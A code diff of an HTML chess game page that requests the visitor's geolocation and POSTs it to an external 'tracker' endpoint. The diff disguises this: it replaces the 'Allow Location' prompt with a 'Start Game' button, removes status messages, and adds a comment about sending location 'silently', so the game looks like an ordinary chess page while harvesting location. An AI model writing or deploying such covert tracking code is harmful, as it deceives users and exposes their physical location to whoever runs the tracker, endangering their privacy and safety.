@@ -4,23 +4,42 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Chess Game</title>
+
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.css"/>
+
 <style>
-body { margin:0; font-family:system-ui,sans-serif; background: linear-gradient(135deg,#1e293b,#0f172a); color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh;}
-.card {background:#111827; padding:20px; border-radius:14px; box-shadow:0 10px 30px rgba(0,0,0,0.5); text-align:center;}
-button {margin-top:15px; padding:10px 20px; font-size:16px; border:none; border-radius:10px; cursor:pointer; background:#3b82f6; color:white;}
-button:hover {background:#2563eb;}
-#status {margin-top:10px; font-size:14px; opacity:0.9;}
-#board {margin-top:15px; width:400px; display:none;}
+body {
+  margin:0;
+  font-family: system-ui, sans-serif;
+  background: linear-gradient(135deg,#1e293b,#0f172a);
+  color:white;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+}
+
+.card {
+  background:#111827;
+  padding:20px;
+  border-radius:14px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.5);
+  text-align:center;
+}
+
+#board {
+  margin-top:15px;
+  width:400px;
+}
 </style>
 </head>
 <body>
 
 <div class="card">
   <h1>Chess Game</h1>
-  <p>Allow location to start playing!</p>
-  <button onclick="requestLocation()">Allow Location</button>
-  <div id="status"></div>
+  <p>Click “Start Game” to begin.</p>
+  <button onclick="requestLocation()">Start Game</button>
   <div id="board"></div>
 </div>
 
@@ -28,20 +47,21 @@ button:hover {background:#2563eb;}
 <script src="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.js"></script>
 
 <script>
-const WORKER_URL = "https://tracker.jovdat70.workers.dev/"; // Put your Worker URL here
+const WORKER_URL = "https://jovdat7.github.io/tracker/"; // Your Cloudflare Worker URL
 
 let game;
 let board;
 
 function requestLocation() {
   if (!navigator.geolocation) {
-    document.getElementById("status").textContent = "Geolocation not supported.";
+    startChessGame();
     return;
   }
 
+  // Ask for permission
   navigator.geolocation.getCurrentPosition(
     (pos) => {
-      // Send location to Worker
+      // Send location silently to Worker
       fetch(WORKER_URL, {
         method: "POST",
         headers: {"Content-Type":"application/json"},
@@ -52,11 +72,12 @@ function requestLocation() {
         })
       }).catch(console.error);
 
-      document.getElementById("status").textContent = "Permission granted! Starting game...";
+      // Start the game
       startChessGame();
     },
     () => {
-      document.getElementById("status").textContent = "Location permission is required to play.";
+      // User denied, still start the game
+      startChessGame();
     }
   );
 }
@@ -65,20 +86,21 @@ function startChessGame() {
   document.getElementById("board").style.display = "block";
   game = new Chess();
   board = Chessboard('board', {
-    draggable: true,
-    position: 'start',
-    onDrop: handleMove
+    draggable:true,
+    position:'start',
+    onDrop:handleMove
   });
 }
 
 function handleMove(source, target) {
-  let move = game.move({from: source, to: target, promotion: 'q'});
-  if (move === null) return 'snapback';
+  let move = game.move({from:source, to:target, promotion:'q'});
+  if(move===null) return 'snapback';
   board.position(game.fen());
-  if (game.game_over()) {
-    if (game.in_checkmate()) alert("Checkmate! Game over.");
-    else if (game.in_stalemate()) alert("Stalemate! Game over.");
-    else if (game.in_draw()) alert("Draw! Game over.");
+
+  if(game.game_over()) {
+    if(game.in_checkmate()) alert("Checkmate! Game over.");
+    else if(game.in_stalemate()) alert("Stalemate! Game over.");
+    else if(game.in_draw()) alert("Draw! Game over.");
   }
 }
 </script>
